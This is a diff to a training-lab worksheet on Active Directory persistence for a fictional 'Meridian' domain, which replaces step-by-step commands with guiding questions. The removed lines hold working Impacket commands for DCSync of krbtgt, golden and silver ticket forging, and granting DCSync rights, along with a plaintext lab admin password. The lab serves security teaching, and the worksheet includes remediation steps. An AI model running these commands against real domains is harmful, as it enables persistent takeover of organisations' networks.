@@ -22,46 +22,17 @@ You have achieved domain admin access on Meridian (modules 04-06). Before the bl
 
 ## Do
 
-1. [ ] **Extract the krbtgt hash.** Using the domain admin credential (`tallen:T@ll3n_IT@dmin!`), DCSync the `krbtgt` account:
-   ```
-   secretsdump.py MERIDIAN.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.meridian.local \
-     -just-dc-user krbtgt
-   ```
-   Note the NT hash for `krbtgt`. Also extract the domain SID (it appears in the secretsdump output, or run `rpcclient -U 'tallen%T@ll3n_IT@dmin!' dc01.meridian.local -c lsaquery`).
+1. [ ] **Extract the krbtgt hash.** With your domain-admin credential, DCSync just the `krbtgt` account and record its NT hash. You also need the domain SID — find it in the dump output or via an RPC LSA query.
 
-2. [ ] **Forge a golden ticket.** Use impacket's ticketer to create a golden ticket for a user that doesn't even need to exist:
-   ```
-   ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain MERIDIAN.LOCAL \
-     -groups 512 phantom_admin
-   ```
-   The `-groups 512` adds the user to Domain Admins (group RID 512). The resulting `phantom_admin.ccache` file contains the forged TGT.
+2. [ ] **Forge a golden ticket.** Forge a TGT for a Domain Admin that need not exist in the directory. (What does the golden ticket require beyond the krbtgt hash and domain SID? Which group RID grants Domain Admins?) Note the resulting ticket-cache artefact.
 
-3. [ ] **Use the golden ticket.** Export the ticket and use it to authenticate:
-   ```
-   export KRB5CCNAME=phantom_admin.ccache
-   klist              # verify the ticket contents
-   secretsdump.py -k -no-pass dc01.meridian.local
-   ```
-   You now have DA-level access as a user who doesn't exist in the directory. Note: does the domain need to be reachable for ticket issuance? (No — the ticket was forged locally.)
+3. [ ] **Use the golden ticket.** Load the forged ticket into your credential cache and use it to perform a DA-only action against the DC. Does the domain need to be reachable for the ticket to be *issued*? Answer in your notes, and explain why.
 
-4. [ ] **Forge a silver ticket.** Extract `svc-mssql`'s hash from secretsdump, then forge a silver ticket for the MSSQL service:
-   ```
-   ticketer.py -nthash SVC_MSSQL_HASH -domain-sid DOMAIN_SID -domain MERIDIAN.LOCAL \
-     -spn MSSQLSvc/db01.meridian.local:1433 -user-id 500 Administrator
-   ```
-   Note: this ticket never touches the KDC — no Event 4769 will appear.
+4. [ ] **Forge a silver ticket.** Using the MSSQL service account's hash, forge a service ticket for the MSSQL SPN impersonating a privileged user. Why does this ticket generate no Event 4769 on the DC?
 
-5. [ ] **Add DCSync rights.** Demonstrate how an attacker adds replication rights to a low-privilege account (`jsmith`) as a persistence mechanism. In the lab environment (requires DA credential):
-   ```
-   dacledit.py MERIDIAN.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.meridian.local \
-     -action write -rights DCSync -principal jsmith -target-dn 'DC=meridian,DC=local'
-   ```
-   Then verify `jsmith` can now DCSync:
-   ```
-   secretsdump.py MERIDIAN.LOCAL/jsmith:'Welcome1!'@dc01.meridian.local -just-dc-ntlm
-   ```
+5. [ ] **Add DCSync rights.** As an attacker with DA, grant replication rights to a low-privilege account as a persistence mechanism, then verify that account can now DCSync. (Which ACE/extended right must you write on the domain object? Which Impacket tool edits a DACL?)
 
-6. [ ] **Write the remediation checklist.** For each persistence method, write down: what specific action removes it? What can the attacker do before the remediation takes effect? (Key: golden tickets remain valid until expiry even after `krbtgt` is rotated once — that's why two rotations are required.)
+6. [ ] **Write the remediation checklist.** For each persistence method, write down: what specific action removes it, and what can the attacker still do before the remediation takes effect? (One of these methods survives a *single* krbtgt rotation — work out which, and why two rotations are required.)
 
 ## Success criteria — you're done when
 
